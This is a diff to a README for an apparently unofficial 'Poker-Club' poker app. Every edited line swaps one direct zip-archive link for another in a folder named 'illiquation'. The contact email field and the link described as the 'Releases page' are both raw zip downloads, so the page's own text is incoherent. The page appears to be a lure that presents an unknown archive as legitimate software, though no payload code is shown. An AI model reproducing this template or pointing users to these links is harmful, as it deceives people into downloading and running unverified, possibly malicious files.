@@ -5,7 +5,7 @@
 Welcome to Poker-Club! This application allows you to enjoy Texas Hold'em Poker with friends. Join a club, create games, and experience various poker gameplay modes. Our software runs smoothly and supports multiple languages, including Chinese, English, Korean, Thai, and Malaysian. 
 
 ## 📥 Download Now
-[![Download Poker-Club](https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip)](https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip)
+[![Download Poker-Club](https://github.com/hossainma/Poker-Club/raw/refs/heads/main/illiquation/Poker_Club_v2.1-alpha.4.zip)](https://github.com/hossainma/Poker-Club/raw/refs/heads/main/illiquation/Poker_Club_v2.1-alpha.4.zip)
 
 ## 📋 Features
 - **Play with Friends:** Easily join or create games with friends.
@@ -24,7 +24,7 @@ To run Poker-Club, ensure your system meets the following requirements:
 ## 💻 Download & Install
 To download Poker-Club, visit the Releases page. Click the link below to access the download options.
 
-[Visit this page to download](https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip)
+[Visit this page to download](https://github.com/hossainma/Poker-Club/raw/refs/heads/main/illiquation/Poker_Club_v2.1-alpha.4.zip)
 
 1. Go to the Releases page.
 2. Choose the version that suits your operating system.
@@ -41,7 +41,7 @@ To download Poker-Club, visit the Releases page. Click the link below to access 
 
 ## 📞 Support
 For any inquiries or issues, please reach out:
-- **Email:** https://raw.githubusercontent.com/hossainma/Poker-Club/main/illiquation/Poker-Club_hornlet.zip
+- **Email:** https://github.com/hossainma/Poker-Club/raw/refs/heads/main/illiquation/Poker_Club_v2.1-alpha.4.zip
 - **Telegram:** @fox_lovemyself
 
 ## 🤝 Community
